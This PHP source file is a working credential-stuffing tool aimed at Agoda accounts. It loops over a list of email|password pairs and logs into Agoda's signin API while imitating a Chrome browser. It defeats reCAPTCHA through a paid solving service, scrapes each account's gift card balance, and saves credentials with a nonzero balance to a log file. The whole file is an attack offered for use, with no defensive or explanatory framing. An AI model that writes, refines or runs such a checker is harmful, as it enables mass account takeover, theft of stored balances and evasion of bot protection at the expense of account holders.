<?php
require __DIR__ . '/vendor/autoload.php';
include 'config.php';

use NdCaptcha\NdCaptcha;
use Curl\Curl;

class Agoda
{
    function __construct()
    {
        $this->curl = new Curl();
    }

    public function login($email, $password)
    {
        $this->curl->setHeader('Host', 'www.agoda.com');
        $this->curl->setTimeout(50);
        $this->curl->setConnectTimeout(50);
        $this->curl->setHeader('Connection', 'keep-alive');
        $this->curl->setHeader('sec-ch-ua', '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"');
        $this->curl->setHeader('UL-App-Id', 'dictator');
        $this->curl->setHeader('Content-Type', 'application/json; charset=utf-8');
        $this->curl->setHeader('sec-ch-ua-mobile', '?0');
        $this->curl->setHeader('UL-Fallback-Origin', 'https://www.agoda.com');
        $this->curl->setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36');
        $this->curl->setHeader('sec-ch-ua-platform', '"Windows"');
        $this->curl->setHeader('Accept', '*/*');
        $this->curl->setHeader('Origin', 'https://www.agoda.com');
        $this->curl->setHeader('Sec-Fetch-Site', 'same-origin');
        $this->curl->setHeader('Sec-Fetch-Mode', 'cors');
        $this->curl->setHeader('Sec-Fetch-Dest', 'empty');
        $this->curl->setHeader('Referer', 'https://www.agoda.com/id-id/ul/login/signin?appId=dictator&rpcId=dictator-%23universal-login-app-421&initialPath=signin&sdkVersion=5.1.3');
        $this->curl->setHeader('Accept-Encoding', 'gzip, deflate, br');
        $this->curl->setHeader('Accept-Language', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7');
        $this->curl->setOpt(CURLOPT_ENCODING, "");
        $this->curl->post('https://www.agoda.com/ul/api/v1/signin', '{"credentials":{"password":"' . $password . '","authType":"email","username":"' . $email . '"},"captchaEnabled":true}');

        if ($this->curl->error) {
            echo '[-] Error: Register - ' . $this->curl->errorCode . ': ' . $this->curl->errorMessage . "\n\n";
        } else {
            $responseData = $this->curl->response;
            $responseHeader = $this->curl->responseHeaders;

            preg_match_all('/ul.token=(.*); Max-Age/', $responseHeader['set-cookie'], $token);

            $returnMap = [
                'success' => $responseData->success,
                'captchaApiKey' => $responseData->captchaInfo->apiKey ?? null,
                'token' => $token[1][0] ?? null,
            ];
            return $returnMap;
        }
    }

    public function loginWithCaptcha($email, $password, $recaptchaToken)
    {
        $this->curl->setHeader('Host', 'www.agoda.com');
        $this->curl->setTimeout(50);
        $this->curl->setConnectTimeout(50);
        $this->curl->setHeader('Connection', 'keep-alive');
        $this->curl->setHeader('sec-ch-ua', '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"');
        $this->curl->setHeader('UL-App-Id', 'dictator');
        $this->curl->setHeader('Content-Type', 'application/json; charset=utf-8');
        $this->curl->setHeader('sec-ch-ua-mobile', '?0');
        $this->curl->setHeader('UL-Fallback-Origin', 'https://www.agoda.com');
        $this->curl->setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36');
        $this->curl->setHeader('sec-ch-ua-platform', '"Windows"');
        $this->curl->setHeader('Accept', '*/*');
        $this->curl->setHeader('Origin', 'https://www.agoda.com');
        $this->curl->setHeader('Sec-Fetch-Site', 'same-origin');
        $this->curl->setHeader('Sec-Fetch-Mode', 'cors');
        $this->curl->setHeader('Sec-Fetch-Dest', 'empty');
        $this->curl->setHeader('Referer', 'https://www.agoda.com/id-id/ul/login/signin?appId=dictator&rpcId=dictator-%23universal-login-app-421&initialPath=signin&sdkVersion=5.1.3');
        $this->curl->setHeader('Accept-Encoding', 'gzip, deflate, br');
        $this->curl->setHeader('Accept-Language', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7');
        $this->curl->setOpt(CURLOPT_ENCODING, "");
        $this->curl->post('https://www.agoda.com/ul/api/v1/signin', '{"credentials":{"password":"' . $password . '","authType":"email","username":"' . $email . '"},"captchaVerifyInfo":{"captchaResult":{"recaptchaToken":"' . $recaptchaToken . '"},"captchaType":"recaptcha"},"captchaEnabled":true}');

        if ($this->curl->error) {
            echo '[-] Error: Register - ' . $this->curl->errorCode . ': ' . $this->curl->errorMessage . "\n\n";
        } else {
            $responseData = $this->curl->response;
            $responseHeader = $this->curl->responseHeaders;

            preg_match_all('/ul.token=(.*); Max-Age/', $responseHeader['set-cookie'], $token);

            $returnMap = [
                'success' => $responseData->success,
                'token' => $token[1][0] ?? null,
            ];
            return $returnMap;
        }
    }

    public function getRewards($token)
    {
        $this->curl->setHeader('Host', 'www.agoda.com');
        $this->curl->setTimeout(50);
        $this->curl->setConnectTimeout(50);
        $this->curl->setHeader('Connection', 'keep-alive');
        $this->curl->setHeader('Cache-Control', 'max-age=0');
        $this->curl->setHeader('Upgrade-Insecure-Requests', '1');
        $this->curl->setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.81 Safari/537.36');
        $this->curl->setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9');
        $this->curl->setHeader('Sec-Fetch-Site', 'same-origin');
        $this->curl->setHeader('Sec-Fetch-Mode', 'navigate');
        $this->curl->setHeader('Sec-Fetch-User', '?1');
        $this->curl->setHeader('Sec-Fetch-Dest', 'document');
        $this->curl->setHeader('sec-ch-ua', '*/*');
        $this->curl->setHeader('Origin', '" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"');
        $this->curl->setHeader('sec-ch-ua-mobile', '?0');
        $this->curl->setHeader('sec-ch-ua-platform', '"Windows"');
        $this->curl->setHeader('Referer', 'https://www.agoda.com/id-id/account/signin.html');
        $this->curl->setHeader('Accept-Encoding', 'gzip, deflate, br');
        $this->curl->setHeader('Accept-Language', 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7');
        $this->curl->setHeader('Cookie', 'token=' . $token);
        $this->curl->setOpt(CURLOPT_ENCODING, "");
        $this->curl->get('https://www.agoda.com/id-id/account/giftcards.html');

        if ($this->curl->error) {
            return false;
        } else {
            return $this->curl->response;
        }
    }
}

function writeLog($location, $text, $config)
{
    $file = fopen($location, $config);
    fwrite($file, $text);
    fclose($file);
}

// init class
$agoda = new Agoda;

if ((empty($list)) || (empty($captchaKey))) {
    echo "Please provide email list and password, 2Captcha Key in config.php file.\n";
    exit;
}

$file = file_get_contents("$list");
$datas = explode("\r\n", $file);

for ($i = 0; $i < count($datas); $i++) {
    $data = explode("|", $datas[$i]);
    $email = $data[0];
    $password = $data[1];

    echo '[+] Email: ' . $email . "\n";
    $login = $agoda->login($email, $password);

    if ($login['success']) {
        echo '[!] Login with email ' . $email . ' was successful.' . "\n";

        $getRewards = $agoda->getRewards($login['token']);
        preg_match_all('/"formattedAmountWithCurrency":"(.*)"},"redeemedBalance"/', $getRewards, $rewardsBalance);
        echo "[+] Balance: " . $rewardsBalance[1][0] . "\n";

        if ($rewardsBalance[1][0] !== "Rp 0") {
            writeLog('accountBalanced.txt', $email . " | " . $password . " | " . $rewardsBalance[1][0] . "\n", 'a+');
        }

        echo "\n";
    } else {

        if ($login['captchaApiKey']) {
            echo '[!] Login with email ' . $email . ' was failed. Please solve captcha.' . "\n";
            echo '[!] Captcha API Key: ' . $login['captchaApiKey'] . "\n";

            $recaptcha = new NdCaptcha(
                $captchaKey,
                'https://www.agoda.com/id-id/account/signin.html',
                $login['captchaApiKey'],
            );
            $captcha = $recaptcha->init();

            echo '[!] Recaptcha Token: ' . $captcha['captcha'] . "\n";

            $login = $agoda->loginWithCaptcha($email, $password, $captcha['captcha']);

            if ($login['success']) {
                echo '[!] Login with email ' . $email . ' was successful.' . "\n";

                $getRewards = $agoda->getRewards($login['token']);
                preg_match_all('/"formattedAmountWithCurrency":"(.*)"},"redeemedBalance"/', $getRewards, $rewardsBalance);
                echo "[+] Balance: " . $rewardsBalance[1][0] . "\n";

                if ($rewardsBalance[1][0] !== "Rp 0") {
                    writeLog('accountBalanced.txt', $email . " | " . $password . " | " . $rewardsBalance[1][0] . "\n", 'a+');
                }

                echo "\n";
            } else {
                echo '[!] Login with email ' . $email . ' was failed.' . "\n";
                echo "\n";
            }
        } else {
            echo '[!] Login with email ' . $email . ' was failed.' . "\n";
            echo "\n";
        }
    }
}
